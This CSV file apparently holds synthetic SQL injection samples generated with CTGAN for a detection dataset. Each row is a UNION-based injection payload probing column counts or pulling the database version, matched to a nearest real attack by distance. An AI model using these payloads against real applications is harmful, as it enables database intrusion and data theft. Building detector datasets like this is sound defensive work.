id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000957,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,7.107612805616071
CTGAN_000958,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,5.5948211557047856
CTGAN_000959,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,8.809645214460371
CTGAN_000960,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,8.454370866387741
CTGAN_000961,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,7.325045179312342
CTGAN_000962,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,5.962474030546431
CTGAN_000963,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.084053395866238
CTGAN_000964,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.582225766429267
CTGAN_000965,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000038,7.5267427557381525
CTGAN_000966,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,4.720658273047465
CTGAN_000967,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,6.479759315426036
CTGAN_000968,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.534513170580714
CTGAN_000969,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,8.001929624512318
CTGAN_000970,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,5.071014384780381
CTGAN_000971,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,6.213676111061214
CTGAN_000972,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,6.303870106043867
CTGAN_000973,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.293176089587939
CTGAN_000974,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,8.943114771124986
CTGAN_000975,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,11.236895647287863
CTGAN_000976,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,7.451630045728488
CTGAN_000977,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,5.644575090080559
CTGAN_000978,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.810097246008554
CTGAN_000979,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,7.864979124787556
CTGAN_000980,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,6.13791837602012
CTGAN_000981,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.294210353834487
CTGAN_000982,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,7.412927250345371
CTGAN_000983,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.093470832828772
CTGAN_000984,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.4021905433959105
CTGAN_000985,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,7.784118769030934
CTGAN_000986,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.495300616943314
CTGAN_000987,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,6.367511171925037
CTGAN_000988,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,6.775755084566836
CTGAN_000989,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,8.166508064719762
CTGAN_000990,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,6.516416682126843
CTGAN_000991,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.3538983459114675
CTGAN_000992,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,5.718595181871803
CTGAN_000993,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,6.191328241470979
CTGAN_000994,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000010,10.599699986416269
CTGAN_000995,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.46788756166705
CTGAN_000996,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000010,10.855446327707185
CTGAN_000997,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,8.394645631800522
CTGAN_000998,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,7.714281302846463
CTGAN_000999,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.524128550648697
CTGAN_001000,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,5.8292480527473325
CTGAN_001001,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,5.773051454211701
CTGAN_001002,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,6.109541885668675
CTGAN_001003,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,6.8459843444833
CTGAN_001004,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,5.927290948271351
CTGAN_001005,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,5.6900684519009
CTGAN_001006,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,6.425077546634583
CTGAN_001007,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.48701877702622
CTGAN_001008,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,7.813977073606884
CTGAN_001009,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,10.73995500283872
CTGAN_001010,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,7.750021686234368
CTGAN_001011,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,6.719735039358314
CTGAN_001012,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,8.283441363341943
CTGAN_001013,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,7.083410770023175
CTGAN_001014,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,8.28099703998468
CTGAN_001015,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,4.391156193568362
CTGAN_001016,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,8.289428395639685
CTGAN_001017,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,7.358615990484193
CTGAN_001018,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,7.493678409013557
CTGAN_001019,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,7.292818097197402
CTGAN_001020,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,5.843655895894085
CTGAN_001021,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,4.996429116854964
CTGAN_001022,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,6.987784672070869
CTGAN_001023,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,5.9517626607898855
CTGAN_001024,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,8.426830410091114
CTGAN_001025,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,6.884389436530612
CTGAN_001026,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,5.484724418585334
CTGAN_001027,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.026878862643668
CTGAN_001028,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.944866499549812
CTGAN_001029,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,5.448740202721987
CTGAN_001030,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,7.700893670247264
CTGAN_001031,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000068,6.8838631634236185
CTGAN_001032,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,7.19600326599647
CTGAN_001033,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,6.278348709374425
CTGAN_001034,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,8.429765568371574
CTGAN_001035,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,8.18116462266382
CTGAN_001036,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,6.48311754990522
CTGAN_001037,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.746013443938601
CTGAN_001038,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,10.26654250858652
CTGAN_001039,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,6.95883875164018
CTGAN_001040,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,7.71437752670345
CTGAN_001041,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,6.210260169957269
CTGAN_001042,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,7.462357749764335
CTGAN_001043,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000078,7.202962771030259
CTGAN_001044,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,6.030649509401198
CTGAN_001045,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,5.865444074071625
CTGAN_001046,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,3.9763545879698454
CTGAN_001047,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,7.199142456509845
CTGAN_001048,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,7.8495062884098
CTGAN_001049,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,6.48894814325941
CTGAN_001050,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,5.81934709431735
CTGAN_001051,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,7.598847668634619
CTGAN_001052,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.277678618259076
CTGAN_001053,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,7.275853829582071
CTGAN_001054,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,7.279048327311257
CTGAN_001055,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,5.441703969454657
CTGAN_001056,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,6.49615426487924
CTGAN_001057,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,4.875110601456678
CTGAN_001058,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.4955099743030855
CTGAN_001059,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,8.571328052551245
CTGAN_001060,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,10.277240588273722
CTGAN_001061,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,8.397283427383462
CTGAN_001062,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,7.758435514652837
CTGAN_001063,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,7.711751186299989
CTGAN_001064,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,5.729251281227397
CTGAN_001065,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,5.982123155157848
CTGAN_001066,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,8.525239551593012
CTGAN_001067,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,5.466767710064617
CTGAN_001068,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,6.357020251883583
CTGAN_001069,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,5.1027025498859935
CTGAN_001070,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,8.284117352280129
CTGAN_001071,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,5.997550788719773
CTGAN_001072,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,4.05756614987819
CTGAN_001073,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,7.008893815772273
CTGAN_001074,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.46559251515695
CTGAN_001075,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,5.372906993925334
CTGAN_001076,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.062435099974638
CTGAN_001077,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,8.720884319731496
CTGAN_001078,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,11.496193575604277
CTGAN_001079,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,7.007653920975292
CTGAN_001080,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,5.614989788575865
CTGAN_001081,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,6.173393973224856
CTGAN_001082,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,7.072134666777938
CTGAN_001083,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,6.503396175134538
CTGAN_001084,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,8.56438941482052
CTGAN_001085,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,6.088405694063866
CTGAN_001086,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.875438113960552
CTGAN_001087,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,7.414467357466106
CTGAN_001088,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,5.245541608843135
CTGAN_001089,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,5.834998909887727
CTGAN_001090,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,7.2549757224045095
CTGAN_001091,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,7.418990330538223
CTGAN_001092,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,10.096027300546757
CTGAN_001093,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,5.793203238508107
CTGAN_001094,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,7.495046219186361
CTGAN_001095,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.451437012803613
CTGAN_001096,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,5.7790935623437045
CTGAN_001097,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,7.6063000464594905
CTGAN_001098,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.966628121145584
CTGAN_001099,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,6.712356454262125
CTGAN_001100,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,6.443707508210288
CTGAN_001101,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.397994786714185
CTGAN_001102,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,7.083822837491796
CTGAN_001103,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.02210170787247
CTGAN_001104,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,7.092581506504186
CTGAN_001105,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.162857425256145
CTGAN_001106,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.164219547623867
CTGAN_001107,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,4.570355232104888
CTGAN_001108,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,6.328285411563922
CTGAN_001109,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,5.853755878537716
CTGAN_001110,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,7.022936326810531
CTGAN_001111,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,8.045361957882774
CTGAN_001112,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000015,10.906841882674618
CTGAN_001113,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,5.022974674050684
CTGAN_001114,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000004,7.446020303450312
CTGAN_001115,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,7.756598930074905
CTGAN_001116,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,7.004180870369166
CTGAN_001117,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,6.905792908931929
CTGAN_001118,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,8.068954682710475
CTGAN_001119,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,6.967454281703323
CTGAN_001120,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,7.140442359365072
CTGAN_001121,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.155032652329223
CTGAN_001122,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,5.537376444123061
CTGAN_001123,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,7.026745864561371
CTGAN_001124,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.392441442379334
CTGAN_001125,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,6.004138907753349
CTGAN_001126,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,6.312650853577369
CTGAN_001127,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.591700206478149
CTGAN_001128,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,7.004111440483636
CTGAN_001129,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,5.177240706103245
CTGAN_001130,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,6.4627393374378315
CTGAN_001131,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,7.213815920887055
CTGAN_001132,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,5.859048689379317
CTGAN_001133,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,7.027090347254983
CTGAN_001134,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,5.869759663275479
CTGAN_001135,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,8.28313216979244
CTGAN_001136,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,7.873975256399477
CTGAN_001137,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,6.469419537847418
CTGAN_001138,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,7.0387879042400066
CTGAN_001139,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,10.85030546637587
CTGAN_001140,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000036,5.696395237682576
CTGAN_001141,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000068,7.856069475902777
CTGAN_001142,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.006996920839927
CTGAN_001143,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,6.3681678904261165
CTGAN_001144,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.141839814040683
CTGAN_001145,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,5.973092675063549
CTGAN_001146,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,7.343059331773189
CTGAN_001147,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,5.658631293284919
CTGAN_001148,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,9.018602515077923
CTGAN_001149,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.780282623959639
CTGAN_001150,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,5.279830924549029
CTGAN_001151,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,5.664612557366874
CTGAN_001152,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,7.380765828291853
CTGAN_001153,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,6.282898318151169
CTGAN_001154,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,5.6814307982981385
CTGAN_001155,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,6.910267744873272
CTGAN_001156,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000078,6.958570192562075
CTGAN_001157,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,5.702200218909843
CTGAN_001158,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,5.027476849780044
CTGAN_001159,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,5.602094361548369
